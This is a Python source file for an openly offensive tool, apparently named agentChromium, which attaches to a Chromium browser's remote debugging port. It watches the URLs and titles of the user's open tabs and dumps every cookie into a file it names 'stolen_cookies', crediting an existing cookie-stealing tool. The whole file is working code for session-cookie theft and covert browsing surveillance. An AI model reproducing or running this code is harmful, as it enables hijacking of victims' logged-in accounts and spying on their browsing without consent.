
import requests
import json
import websocket
import cmd
import threading

### TODOS
# 1. Adding fail_safe feature for setTargetDiscovery, because if the tab gets destroyed/changed, we will lose the socket connection
# 2. Adding trigger for cookiedump when seeing a speicfic keyword/traffic.
# 2. Adding Json parsing for monitoring.
# 3. Adding more features, such as activateTab.


wsDEBUGURLS=[]

websocket.enableTrace(False)

def on_error(ws, message):
    print(message)

def on_open(ws):
    print("On_OPEN!!!!")
    ws.send("""{
	"id": 2,
	"method": "Target.setDiscoverTargets",
	"params": {
		"discover": true
	}
}""")

def on_message(ws, message):
    parseIncomingTargetsInfo(message)
def on_close(ws, close_status_code, close_msg):
    print(">>>>>>>>> User CLOSED debug tab, try a new one")
    ws.close()
    print("""========== Press Enter or Type "setTargetDiscovery" again to restart the monitoring websocket""")
    

@staticmethod
def parseIncomingTargetsInfo(jsonNode):
    node = json.loads(jsonNode)
    #print(jsonNode)
    print("[{}][{}][{}]".format(node["method"],node["params"]["targetInfo"]["url"], node["params"]["targetInfo"]["title"]))
@staticmethod
def getDebuggerUrlsandInfo():
    #Making GET request to remote localhost with the debug port we specified.
        r = requests.get(f"http://localhost:{DEBUG_PORT}/json")
        totalTabs = r.json()
        debuggerUrls = []
        for tabs in totalTabs:
            url = tabs["webSocketDebuggerUrl"]
            debuggerUrls.append(url)
        #print(debuggerUrls)
        #print(totalTabs)
        return debuggerUrls
@staticmethod
def getBrowserVersion():
    #print(debuggerURL)
    r = requests.get(f"http://localhost:{DEBUG_PORT}/json/version")
    browserInfo= r.json()
    userAgent = browserInfo['User-Agent']
    print("[*] Got User-Agnet for the   end-user browser {}".format(userAgent))
    print("[*] If you want to use another browser later, here is what you prob want to set the User-Agent header to {}".format(userAgent.replace("Headless", "")))
    r.close()

class agentShell(cmd.Cmd):
    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = 'agentChromium>'
        self.intro = '[*] agentChromium is a creeper. He loves to watch you while you browse..\n[*] Type help to see commands supported...'
        self.agent = agentChromium()  
        self.DebugURLs= getDebuggerUrlsandInfo()
        print(self.DebugURLs)
        self.threads = set()
    try:
        print("Trying to get Debug URLs for initialization...")
    except:
        print("[x] failed to load")
    def do_getCookie(self,args):
        for urls in self.DebugURLs:
            if (agentChromium.getThemCookies(self.agent.websocket, urls)):
                self.agent.websocket.close()
                break

    def do_setDiscoveryTargets(self,args):
        self.DebugURLs = getDebuggerUrlsandInfo()
        url =self.DebugURLs
        print(url)
        t = threading.Thread(target=agentChromium.setDiscoveryTargets, args=(self,self.DebugURLs))
        t.start()

DEBUG_PORT=9222

threads = list()
class agentChromium:
    def __init__(self):
        self.websocket = websocket.WebSocket()
        #Default 9222 port for remote debugging
        self.remoteDebugPort = 9222
    def setRemoteDebugPort(self, port):
        self.remoteDebugPort = port 

    def setDiscoveryTargets(self,urls):
        print("entering discoveryTarget")
        url = urls[0]
        wsapp = websocket.WebSocketApp(url, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close)
        wsapp.keep_running= True
        #Reusing Websocket

        wsapp.run_forever(ping_timeout=10)
    
        return 
    def getThemCookies(ws ,url):
	# Credit to Elliot Grey's Cookienapper https://github.com/greycatsec/cookienapper
        ws.connect(url)
        ws.send('{\"id\":1, \"method\":\"Network.getAllCookies\"}')
        try:
            response = json.loads(ws.recv())
            cookies = response['result']['cookies']
            print("[*] Loaded cookies sucessfully, populating domain lists for owned cookies")
            json_cookies = json.dumps(cookies, indent=4)
            ws.close(0)
            with open("pre_mod_stolen_cookies.json","w+") as f:
                f.write(json_cookies.replace(r'".', r'"'))
            #os.system("sed -E \'s/\"\./\"/\' pre_mod_stolen_cookies.json > cookies.json")
            print("Done! Find your cookies in cookies.json and savor their flavor!")
            ws.close()
            return True
            
        except:
            print("[x] Failed to load cookies into jason, printing them out")
            print(ws.recv())
            ws.close()
            return False

if __name__ == "__main__":
    threads = set()
    c = agentChromium()
    c.setRemoteDebugPort(9222)
    getBrowserVersion()
    wsDEBUGURLS= getDebuggerUrlsandInfo()

    try:
        shell = agentShell()
        shell.cmdloop()
    except KeyboardInterrupt:
        pass

